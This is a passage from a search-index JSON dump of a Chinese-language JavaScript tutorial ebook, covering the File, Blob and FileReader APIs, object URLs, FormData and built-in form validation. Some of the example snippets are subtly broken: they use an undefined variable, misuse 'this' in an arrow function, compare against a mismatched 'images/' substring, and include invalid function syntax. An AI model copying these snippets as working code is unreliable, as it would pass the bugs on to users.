\u7684\u4e0a\u4f20\u7ec4\u4ef6\uff0c\u6d4f\u89c8\u5668\u4e0d\u5141\u8bb8\u811a\u672c\u76f4\u63a5\u63a7\u5236value\uff0c\u5fc5\u987b\u7528\u6237\u4e0a\u4f20\u3002\u7528\u6237\u9009\u597d\u6587\u4ef6\u540e\uff0c\u5373\u53ef\u8bfb\u53d6\u6587\u4ef6\u3002\u6587\u4ef6\u8f93\u5165input\u548c\u62d6\u62fd\u5bf9\u8c61dataTransfer \u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u7c7b\u6570\u7ec4\uff0cFileList\uff0c\u6bcf\u4e00\u4e2aitem\u662f\u4e00\u4e2aFile\u5bf9\u8c61\uff08File\u5bf9\u8c61\u662fBlob\u6784\u9020\u51fd\u6570\u7684\u7279\u6b8a\u5b9e\u4f8b\uff0c\u5177\u6709 name,lastModifiedData \u7684\u5c5e\u6027\uff09</p> <pre><code>// HTML \u4ee3\u7801\u5982\u4e0b\n// &lt;input type=\"file\" accept=\"image/*\" multiple onchange=\"fileinfo(this.files)\"/&gt;\n\nfunction fileinfo(files) {\n  for (let i = 0; i &lt; files.length; i++) {\n    console.log(file);\n  }\n}\n</code></pre>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#_4","title":"\u4e0b\u8f7d\u6587\u4ef6","text":"<p>\u5728AJAX\u8bf7\u6c42\u4e2d\uff0c\u5982\u679c\u8bbe\u7f6eresponseType = blob \u4e0b\u8f7d\u7684\u7ed3\u679c\u5c31\u662fBlob\u5bf9\u8c61</p> <pre><code>let xhr = new XMLHttpRequest();\nxhr.open('GET', null);\nxhr.responseType = 'blob';\nxhr.onload = () =&gt; {\n  console.log(xhr.response);\n}\nxhr.send(null);\n</code></pre>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#url_1","title":"\u751f\u6210URL","text":"<p>\u6d4f\u89c8\u5668\u5141\u8bb8\u4f7f\u7528<code>URL.createObjectURL()</code>\u65b9\u6cd5\uff0c\u9488\u5bf9 Blob \u5bf9\u8c61\u751f\u6210\u4e00\u4e2a\u4e34\u65f6 URL\uff0c\u4ee5\u4fbf\u4e8e\u67d0\u4e9b API \u4f7f\u7528\u3002</p> <pre><code>var droptarget = document.getElementById('droptarget');\ndroptarget.ondrop = (e) =&gt; {\n  let files = e.dataTransfer.files;\n  for (let i = 0; i &lt; files.length; i++) {\n    let type = files[i].type;\n    if (type.substring(0, 6) !== 'images/') {\n      continue;\n    }\n    let img = document.createElement('img');\n    img.src = URL.createObjectURL(files[i]);\n    img.onload = () =&gt; {\n      this.width = 100;\n      document.body.appendChild(this);\n      URL.revokeObjectURL(this.src);\n    }\n  }\n}\n</code></pre>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#_5","title":"\u8bfb\u53d6\u6587\u4ef6","text":"<p>\u53d6\u5f97 Blob \u5bf9\u8c61\u4ee5\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7<code>FileReader</code>\u5bf9\u8c61\uff0c\u8bfb\u53d6 Blob \u5bf9\u8c61\u7684\u5185\u5bb9\uff0c\u5373\u6587\u4ef6\u5185\u5bb9\u3002</p> <p>FileReader \u5bf9\u8c61\u63d0\u4f9b\u56db\u4e2a\u65b9\u6cd5\uff0c\u5904\u7406 Blob \u5bf9\u8c61\u3002Blob \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u8fd9\u4e9b\u65b9\u6cd5\uff0c\u7136\u540e\u4ee5\u6307\u5b9a\u7684\u683c\u5f0f\u8fd4\u56de\u3002</p> <ul> <li><code>FileReader.readAsText()</code>\uff1a\u8fd4\u56de\u6587\u672c\uff0c\u9700\u8981\u6307\u5b9a\u6587\u672c\u7f16\u7801\uff0c\u9ed8\u8ba4\u4e3a UTF-8\u3002</li> <li><code>FileReader.readAsArrayBuffer()</code>\uff1a\u8fd4\u56de ArrayBuffer \u5bf9\u8c61\u3002</li> <li><code>FileReader.readAsDataURL()</code>\uff1a\u8fd4\u56de Data URL\u3002</li> <li><code>FileReader.readAsBinaryString()</code>\uff1a\u8fd4\u56de\u539f\u59cb\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002</li> </ul> <p>\u4e0b\u9762\u662f<code>FileReader.readAsText()</code>\u65b9\u6cd5\u7684\u4f8b\u5b50\uff0c\u7528\u6765\u8bfb\u53d6\u6587\u672c\u6587\u4ef6\u3002</p> <pre><code>// HTML \u4ee3\u7801\u5982\u4e0b\n// &lt;input type=\u2019file' onchange='readfile(this.files[0])'&gt;&lt;/input&gt;\n// &lt;pre id='output'&gt;&lt;/pre&gt;\n\nfunction readfile(file) {\n  var reader = new FileReader();\n  reader.readAsText(file);\n  reader.onload = function () {\n    var text = reader.result;\n    var out = document.getElementById('output');\n    out.innerHTML = '';\n    out.appendChild(document.createTextNode(text));\n  }\n  reader.onerror = function(e) {\n    console.log('Error', e);\n  };\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7\u6307\u5b9a FileReader \u5b9e\u4f8b\u5bf9\u8c61\u7684<code>onload</code>\u76d1\u542c\u51fd\u6570\uff0c\u5728\u5b9e\u4f8b\u7684<code>result</code>\u5c5e\u6027\u4e0a\u62ff\u5230\u6587\u4ef6\u5185\u5bb9\u3002</p> <p>\u4e0b\u9762\u662f<code>FileReader.readAsArrayBuffer()</code>\u65b9\u6cd5\u7684\u4f8b\u5b50\uff0c\u7528\u4e8e\u8bfb\u53d6\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p> <pre><code>// HTML \u4ee3\u7801\u5982\u4e0b\n// &lt;input type=\"file\" onchange=\"typefile(this.files[0])\"&gt;&lt;/input&gt;\n\nfunction typefile(file) {\n  // \u6587\u4ef6\u5f00\u5934\u7684\u56db\u4e2a\u5b57\u8282\uff0c\u751f\u6210\u4e00\u4e2a Blob \u5bf9\u8c61\n  var slice = file.slice(0, 4);\n  var reader = new FileReader();\n  // \u8bfb\u53d6\u8fd9\u56db\u4e2a\u5b57\u8282\n  reader.readAsArrayBuffer(slice);\n  reader.onload = function (e) {\n    var buffer = reader.result;\n    // \u5c06\u8fd9\u56db\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\uff0c\u89c6\u4f5c\u4e00\u4e2a32\u4f4d\u6574\u6570\n    var view = new DataView(buffer);\n    var magic = view.getUint32(0, false);\n    // \u6839\u636e\u6587\u4ef6\u7684\u524d\u56db\u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u5b83\u7684\u7c7b\u578b\n    switch(magic) {\n      case 0x89504E47: file.verified_type = 'image/png'; break;\n      case 0x47494638: file.verified_type = 'image/gif'; break;\n      case 0x25504446: file.verified_type = 'application/pdf'; break;\n      case 0x504b0304: file.verified_type = 'application/zip'; break;\n    }\n    console.log(file.name, file.verified_type);\n  };\n}  \n</code></pre>"},{"location":"ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#1012-file-filelist-filereader","title":"10.12 File, FileList, FileReader","text":"<p>File \u5bf9\u8c61\uff1aFile\u5bf9\u8c61\u662f\u4e00\u4e2a\u7279\u6b8a\u7684Blob\u5b9e\u4f8b\uff0c\u6587\u4ef6\u4e0a\u4f20\u540e\uff0c\u5373\u53ef\u4eceinput\u5143\u7d20\u4e2d\u62ff\u5230\u8fd9\u4e2a\u5bf9\u8c61</p> <pre><code>let file = document.getElementById('file-update').files[0];\n\n\u6784\u9020\u51fd\u6570\nlet file = new File(array, name, options);\narray \u662f\u6587\u4ef6\u6570\u7ec4\uff08\u53ef\u4ee5\u4f7farraybuffer\u6216\u8005string\uff0cname\u662f\u6587\u4ef6\u8def\u5f84\u6216\u8005\u6587\u4ef6\u540d\uff0coptions\u662f\u914d\u7f6e\u6587\u4ef6\uff0ctype=\"application/json\", lastModified: \u65f6\u95f4\u6233\uff09\n\n\u5c5e\u6027\u548c\u65b9\u6cd5\nfile.name\nfile.size\nfile.type\nfile.lastModified\nfile.slice() \u8fd9\u662f\u7ee7\u627f\u81eaBlob\u5bf9\u8c61\u7684\u65b9\u6cd5\n</code></pre> <p>FileList \u4f2a\u6570\u7ec4\uff0c\u6bcf\u4e00\u9879\u662f\u4e00\u4e2aFile\u5bf9\u8c61\uff1a\u6587\u4ef6\u8f93\u5165\u9009\u62e9\u6216\u8005\u62d6\u62fd\u5143\u7d20\u8282\u70b9\u8fd4\u56de\u7684\u5c31\u662fFileList\u5bf9\u8c61\u3002FileList.length \u8fd4\u56de\u7684\u957f\u5ea6\u8868\u793a\u5305\u542b\u6587\u4ef6\u7684\u4e2a\u6570\u3002</p> <p>FileReader \u5bf9\u8c61\u7528\u4e8e\u8bfb\u53d6\u6587\u4ef6\u5bf9\u8c61\u7684\u5185\u5bb9\u3002</p> <pre><code>let reader = new FileReader();\n\n\u5c5e\u6027\u548c\u65b9\u6cd5\nreader.error\nreader.readyState(\u8868\u793a\u52a0\u8f7d\u7684\u8fc7\u7a0b0-1-2)\u672a\u52a0\u8f7d-\u6b63\u5728\u52a0\u8f7d-\u52a0\u8f7d\u5b8c\u6210\nreader.result \u8bfb\u53d6\u5b8c\u6210\u540e\u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u53ef\u80fd\u662f\u5b57\u7b26\u4e32\u6216\u8005arraybuffer\u5b9e\u4f8b\n\nreader.onabort\nreader.onerror\nreader.onload\nreader.onloadstart\nreader.onloadend\nreader.onprogress\n</code></pre> <p>eg</p> <pre><code>// HTML \u4ee3\u7801\u5982\u4e0b\n// &lt;input type=\"file\" onchange=\"onChange(event)\"&gt;\nfunction onChange = (e) =&gt; {\n  let file = e.target.files[0];\n  let reader = new FileReader();\n  reader.readAsText(file);\n  reader.onload = (event) =&gt; {\n    console.log(event.target.result);\n  };\n}\n</code></pre> <p>FileReader \u6709\u4ee5\u4e0b\u5b9e\u4f8b\u65b9\u6cd5\u3002</p> <ul> <li>FileReader.abort()\uff1a\u7ec8\u6b62\u8bfb\u53d6\u64cd\u4f5c\uff0c<code>readyState</code>\u5c5e\u6027\u5c06\u53d8\u6210<code>2</code>\u3002</li> <li>FileReader.readAsArrayBuffer()\uff1a\u4ee5 ArrayBuffer \u7684\u683c\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u8bfb\u53d6\u5b8c\u6210\u540e<code>result</code>\u5c5e\u6027\u5c06\u8fd4\u56de\u4e00\u4e2a ArrayBuffer \u5b9e\u4f8b\u3002</li> <li>FileReader.readAsBinaryString()\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\uff0c<code>result</code>\u5c5e\u6027\u5c06\u8fd4\u56de\u539f\u59cb\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002</li> <li>FileReader.readAsDataURL()\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\uff0c<code>result</code>\u5c5e\u6027\u5c06\u8fd4\u56de\u4e00\u4e2a Data URL \u683c\u5f0f\uff08Base64 \u7f16\u7801\uff09\u7684\u5b57\u7b26\u4e32\uff0c\u4ee3\u8868\u6587\u4ef6\u5185\u5bb9\u3002\u5bf9\u4e8e\u56fe\u7247\u6587\u4ef6\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u53ef\u4ee5\u7528\u4e8e<code>&lt;img&gt;</code>\u5143\u7d20\u7684<code>src</code>\u5c5e\u6027\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4e0d\u80fd\u76f4\u63a5\u8fdb\u884c Base64 \u89e3\u7801\uff0c\u5fc5\u987b\u628a\u524d\u7f00<code>data:*/*;base64,</code>\u4ece\u5b57\u7b26\u4e32\u91cc\u5220\u9664\u4ee5\u540e\uff0c\u518d\u8fdb\u884c\u89e3\u7801\u3002</li> <li>FileReader.readAsText()\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\uff0c<code>result</code>\u5c5e\u6027\u5c06\u8fd4\u56de\u6587\u4ef6\u5185\u5bb9\u7684\u6587\u672c\u5b57\u7b26\u4e32\u3002\u8be5\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4ee3\u8868\u6587\u4ef6\u7684 Blob \u5b9e\u4f8b\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u8868\u793a\u6587\u672c\u7f16\u7801\uff0c\u9ed8\u8ba4\u4e3a UTF-8\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>/* HTML \u4ee3\u7801\u5982\u4e0b\n  &lt;input type=\"file\" onchange=\"previewFile()\"&gt;\n  &lt;img src=\"\" height=\"200\"&gt;\n*/\n\nfunction previewFile() {\n  var preview = document.querySelector('img');\n  var file    = document.querySelector('input[type=file]').files[0];\n  var reader  = new FileReader();\n\n  reader.addEventListener('load', function () {\n    preview.src = reader.result;\n  }, false);\n\n  if (file) {\n    reader.readAsDataURL(file);\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7528\u6237\u9009\u4e2d\u56fe\u7247\u6587\u4ef6\u4ee5\u540e\uff0c\u811a\u672c\u4f1a\u81ea\u52a8\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u7136\u540e\u4f5c\u4e3a\u4e00\u4e2a Data URL \u8d4b\u503c\u7ed9<code>&lt;img&gt;</code>\u5143\u7d20\u7684<code>src</code>\u5c5e\u6027\uff0c\u4ece\u800c\u628a\u56fe\u7247\u5c55\u793a\u51fa\u6765\u3002</p>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/","title":"10-3-\u8868\u5355","text":""},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#bom","title":"\u7b2c\u5341\u7ae0 BOM","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 11126  \u9605\u8bfb23\u5206\u949f</p> <p>2021-11-24 2023-04-11</p>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#1013-formdata","title":"10.13 \u8868\u5355/FormData","text":""},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#form","title":"\u8868\u5355 form","text":"<pre><code>&lt;form action='/handling-page' method='post' id=\"myform\"&gt;\n  &lt;div&gt;\n    &lt;label for=\"name\"&gt;&lt;/label&gt;\n    &lt;input type=\"text\" id=\"name\" name=\"user_name\"/&gt;\n  &lt;/div&gt;\n  &lt;input type=\"submit\" id=\"submit\" name=\"submit_button\" value=\"submit\"/&gt;\n&lt;/form&gt;\n</code></pre> <p>\u5f53\u70b9\u51fb\u63d0\u4ea4\u65f6\uff0c\u5185\u90e8\u7684\u8868\u5355\u4f1a\u4ee5\u952e\u503c\u5bf9\uff08name=value\uff09\u7684\u5f62\u5f0f\u63d0\u4ea4\u5230\u670d\u52a1\u5668\uff1b\u5982\u679c\u662fGET\u7684\u8bf7\u6c42\u65b9\u6cd5\uff0c\u5c31\u5728URL\u4e2d\u4ee5\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\uff08?name=Michael&amp;password=test\uff09\uff0c\u8bf7\u6c42\u5934\u5c31\u662f\u8fd9\u6837\u7684\u3002\u5982\u679c\u662fPOST\u8bf7\u6c42\uff0c\u5c31\u4f1a\u5c06\u8fd9\u90e8\u5206\u53c2\u6570\u8f6c\u5316\u6210Formdata\u8fdb\u884c\u4f20\u9012\u3002</p>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#form-data","title":"Form Data \u5bf9\u8c61","text":"<p>\u53ef\u4ee5\u624b\u52a8\u6784\u9020 Form data\u5bf9\u8c61\u5e76\u53d1\u9001\u8bf7\u6c42</p> <pre><code>let form = document.getElementById('myForm');\nlet formData = new FormData(form);\n\n\u5b9e\u4f8b\u65b9\u6cd5\nformData.get('user_name') //\nformData.getAll();\nformData.set('password', '123456');\nformData.append('key1', 'value1');\nformData.delete('key');\nformData.has(key)\nformData.keys()\nformData.values()\nformData.entries()\n</code></pre>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#_1","title":"\u8868\u5355\u7684\u5185\u7f6e\u9a8c\u8bc1","text":""},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#_2","title":"\u81ea\u52a8\u6821\u9a8c","text":"<p>\u8868\u5355\u63d0\u4ea4\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u5141\u8bb8\u5f00\u53d1\u8005\u6307\u5b9a\u4e00\u4e9b\u6761\u4ef6\uff0c\u5b83\u4f1a\u81ea\u52a8\u9a8c\u8bc1\u5404\u4e2a\u8868\u5355\u63a7\u4ef6\u7684\u503c\u662f\u5426\u7b26\u5408\u6761\u4ef6\u3002</p> <pre><code>&lt;!-- \u5fc5\u586b --&gt;\n&lt;input required&gt;\n\n&lt;!-- \u5fc5\u987b\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f --&gt;\n&lt;input pattern=\"banana|cherry\"&gt;\n\n&lt;!-- \u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u4e3a6\u4e2a\u5b57\u7b26 --&gt;\n&lt;input minlength=\"6\" maxlength=\"6\"&gt;\n\n&lt;!-- \u6570\u503c\u5fc5\u987b\u57281\u523010\u4e4b\u95f4 --&gt;\n&lt;input type=\"number\" min=\"1\" max=\"10\"&gt;\n\n&lt;!-- \u5fc5\u987b\u586b\u5165 Email \u5730\u5740 --&gt;\n&lt;input type=\"email\"&gt;\n\n&lt;!-- \u5fc5\u987b\u586b\u5165 URL --&gt;\n&lt;input type=\"URL\"&gt;\n</code></pre> <p>\u5982\u679c\u4e00\u4e2a\u63a7\u4ef6\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5b83\u5c31\u4f1a\u5339\u914d<code>:valid</code>\u7684 CSS \u4f2a\u7c7b\uff0c\u6d4f\u89c8\u5668\u4f1a\u7ee7\u7eed\u8fdb\u884c\u8868\u5355\u63d0\u4ea4\u7684\u6d41\u7a0b\u3002\u5982\u679c\u6ca1\u6709\u901a\u8fc7\u9a8c\u8bc1\uff0c\u8be5\u63a7\u4ef6\u5c31\u4f1a\u5339\u914d<code>:invalid</code>\u7684 CSS \u4f2a\u7c7b\uff0c\u6d4f\u89c8\u5668\u4f1a\u7ec8\u6b62\u8868\u5355\u63d0\u4ea4\uff0c\u5e76\u663e\u793a\u4e00\u4e2a\u9519\u8bef\u4fe1\u606f\u3002</p>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#checkvalidity","title":"checkValidity()","text":"<p>\u624b\u52a8\u89e6\u53d1\u8868\u5355\u7684\u6821\u9a8c\u3002\u8868\u5355\u5143\u7d20\u548c\u8868\u5355\u63a7\u4ef6\u90fd\u6709<code>checkValidity()</code>\u65b9\u6cd5\uff0c\u7528\u4e8e\u624b\u52a8\u89e6\u53d1\u6821\u9a8c\u3002</p> <pre><code>// \u89e6\u53d1\u6574\u4e2a\u8868\u5355\u7684\u6821\u9a8c\nform.checkValidity()\n\n// \u89e6\u53d1\u5355\u4e2a\u8868\u5355\u63a7\u4ef6\u7684\u6821\u9a8c\nformControl.checkValidity()\n</code></pre> <p><code>checkValidity()</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c<code>true</code>\u8868\u793a\u901a\u8fc7\u6821\u9a8c\uff0c<code>false</code>\u8868\u793a\u6ca1\u6709\u901a\u8fc7\u6821\u9a8c\u3002\u56e0\u6b64\uff0c\u63d0\u4ea4\u8868\u5355\u53ef\u4ee5\u5c01\u88c5\u4e3a\u4e0b\u9762\u7684\u51fd\u6570\u3002</p> <pre><code>function submitForm(action) {\n  var form = document.getElementById('form');\n  form.action = action;\n  if (form.checkValidity()) {\n    form.submit();\n  }\n}\n</code></pre>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#willvalidate","title":"willValidate \u5c5e\u6027","text":"<p>\u63a7\u4ef6\u5143\u7d20\u7684<code>willValidate</code>\u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u63a7\u4ef6\u662f\u5426\u4f1a\u5728\u63d0\u4ea4\u65f6\u8fdb\u884c\u6821\u9a8c\u3002</p> <pre><code>// HTML \u4ee3\u7801\u5982\u4e0b\n// &lt;form novalidate&gt;\n//   &lt;input id=\"name\" name=\"name\" required /&gt;\n// &lt;/form&gt;\n\nvar input = document.querySelector('#name');\ninput.willValidate // true\n</code></pre>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#validationmessage","title":"validationMessage \u5c5e\u6027","text":"<p>\u63a7\u4ef6\u5143\u7d20\u7684<code>validationMessage</code>\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u63a7\u4ef6\u4e0d\u6ee1\u8db3\u6821\u9a8c\u6761\u4ef6\u65f6\uff0c\u6d4f\u89c8\u5668\u663e\u793a\u7684\u63d0\u793a\u6587\u672c\u3002\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002</p> <ul> <li>\u8be5\u63a7\u4ef6\u4e0d\u4f1a\u5728\u63d0\u4ea4\u65f6\u81ea\u52a8\u6821\u9a8c</li> <li>\u8be5\u63a7\u4ef6\u6ee1\u8db3\u6821\u9a8c\u6761\u4ef6</li> </ul> <pre><code>// HTML \u4ee3\u7801\u5982\u4e0b\n// &lt;form&gt;&lt;input type=\"text\" required&gt;&lt;/form&gt;\ndocument.querySelector('form input').validationMessage\n// \"\u8bf7\u586b\u5199\u6b64\u5b57\u6bb5\u3002\"\n</code></pre> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>var myInput = document.getElementById('myinput');\nif (!myInput.checkValidity()) {\n  document.getElementById('prompt').innerHTML = myInput.validationMessage;\n}\n</code></pre>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#setcustomvalidity","title":"setCustomValidity()","text":"<p>\u63a7\u4ef6\u5143\u7d20\u7684<code>setCustomValidity()</code>\u65b9\u6cd5\u7528\u6765\u5b9a\u5236\u6821\u9a8c\u5931\u8d25\u65f6\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be5\u5b57\u7b26\u4e32\u5c31\u662f\u5b9a\u5236\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5982\u679c\u53c2\u6570\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u4e0a\u6b21\u8bbe\u7f6e\u7684\u62a5\u9519\u4fe1\u606f\u88ab\u6e05\u9664\u3002</p> <p>\u5982\u679c\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5e76\u4e14\u53c2\u6570\u4e0d\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u8ba4\u4e3a\u63a7\u4ef6\u6ca1\u6709\u901a\u8fc7\u6821\u9a8c\uff0c\u5c31\u4f1a\u7acb\u523b\u663e\u793a\u8be5\u65b9\u6cd5\u8bbe\u7f6e\u7684\u62a5\u9519\u4fe1\u606f\u3002</p> <pre><code>/* HTML \u4ee3\u7801\u5982\u4e0b\n&lt;form&gt;\n  &lt;p&gt;&lt;input type=\"file\" id=\"fs\"&gt;&lt;/p&gt;\n  &lt;p&gt;&lt;input type=\"submit\"&gt;&lt;/p&gt;\n&lt;/form&gt;\n*/\n\ndocument.getElementById('fs').onchange = checkFileSize;\n\nfunction checkFileSize() {\n  var fs = document.getElementById('fs');\n  var files = fs.files;\n  if (files.length &gt; 0) {\n     if (files[0].size &gt; 75 * 1024) {\n       fs.setCustomValidity('\u6587\u4ef6\u4e0d\u80fd\u5927\u4e8e 75KB');\n       return;\n     }\n  }\n  fs.setCustomValidity('');\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e00\u65e6\u53d1\u73b0\u6587\u4ef6\u5927\u4e8e 75KB\uff0c\u5c31\u4f1a\u8bbe\u7f6e\u6821\u9a8c\u5931\u8d25\uff0c\u540c\u65f6\u7ed9\u51fa\u81ea\u5b9a\u4e49\u7684\u62a5\u9519\u4fe1\u606f\u3002\u7136\u540e\uff0c\u70b9\u51fb\u63d0\u4ea4\u6309\u94ae\u65f6\uff0c\u5c31\u4f1a\u663e\u793a\u62a5\u9519\u4fe1\u606f\u3002\u8fd9\u79cd\u6821\u9a8c\u5931\u8d25\u662f\u4e0d\u4f1a\u81ea\u52a8\u6d88\u9664\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6240\u6709\u6587\u4ef6\u90fd\u7b26\u5408\u6761\u4ef6\uff0c\u8981\u5c06\u62a5\u9519\u4fe1\u606f\u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u624b\u52a8\u6d88\u9664\u6821\u9a8c\u5931\u8d25\u7684\u72b6\u6001\u3002</p>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#validity","title":"validity \u5c5e\u6027","text":"<p>\u63a7\u4ef6\u5143\u7d20\u7684\u5c5e\u6027<code>validity</code>\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a<code>ValidityState</code>\u5bf9\u8c61\uff0c\u5305\u542b\u5f53\u524d\u6821\u9a8c\u72b6\u6001\u7684\u4fe1\u606f\u3002</p> <p>\u8be5\u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\uff0c\u5168\u90e8\u4e3a\u53ea\u8bfb\u5c5e\u6027\u3002</p> <ul> <li><code>ValidityState.badInput</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u4e0d\u80fd\u5c06\u7528\u6237\u7684\u8f93\u5165\u8f6c\u6362\u6210\u6b63\u786e\u7684\u7c7b\u578b\uff0c\u6bd4\u5982\u7528\u6237\u5728\u6570\u503c\u6846\u91cc\u9762\u8f93\u5165\u5b57\u7b26\u4e32\u3002</li> <li><code>ValidityState.customError</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5df2\u7ecf\u8c03\u7528<code>setCustomValidity()</code>\u65b9\u6cd5\uff0c\u5c06\u6821\u9a8c\u4fe1\u606f\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u7a7a\u5b57\u7b26\u4e32\u3002</li> <li><code>ValidityState.patternMismatch</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u662f\u5426\u4e0d\u6ee1\u8db3\u6a21\u5f0f\u7684\u8981\u6c42\u3002</li> <li><code>ValidityState.rangeOverflow</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u662f\u5426\u5927\u4e8e\u6700\u5927\u8303\u56f4\u3002</li> <li><code>ValidityState.rangeUnderflow</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u662f\u5426\u5c0f\u4e8e\u6700\u5c0f\u8303\u56f4\u3002</li> <li><code>ValidityState.stepMismatch</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u4e0d\u7b26\u5408\u6b65\u957f\u7684\u8bbe\u7f6e\uff08\u5373\u4e0d\u80fd\u88ab\u6b65\u957f\u503c\u6574\u9664\uff09\u3002</li> <li><code>ValidityState.tooLong</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u5b57\u6570\u8d85\u51fa\u4e86\u6700\u957f\u5b57\u6570\u3002</li> <li><code>ValidityState.tooShort</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u5c11\u4e8e\u6700\u77ed\u5b57\u6570\u3002</li> <li><code>ValidityState.typeMismatch</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u586b\u5165\u7684\u503c\u4e0d\u7b26\u5408\u7c7b\u578b\u8981\u6c42\uff08\u4e3b\u8981\u662f\u7c7b\u578b\u4e3a Email \u6216 URL \u7684\u60c5\u51b5\uff09\u3002</li> <li><code>ValidityState.valid</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u662f\u5426\u6ee1\u8db3\u6240\u6709\u6821\u9a8c\u6761\u4ef6\u3002</li> <li><code>ValidityState.valueMissing</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u6ca1\u6709\u586b\u5165\u5fc5\u586b\u7684\u503c\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>var input = document.getElementById('myinput');\nif (input.validity.valid) {\n  console.log('\u901a\u8fc7\u6821\u9a8c');\n} else {\n  console.log('\u6821\u9a8c\u5931\u8d25');\n}\n</code></pre> <p>\u4e0b\u9762\u662f\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>var txt = '';\nif 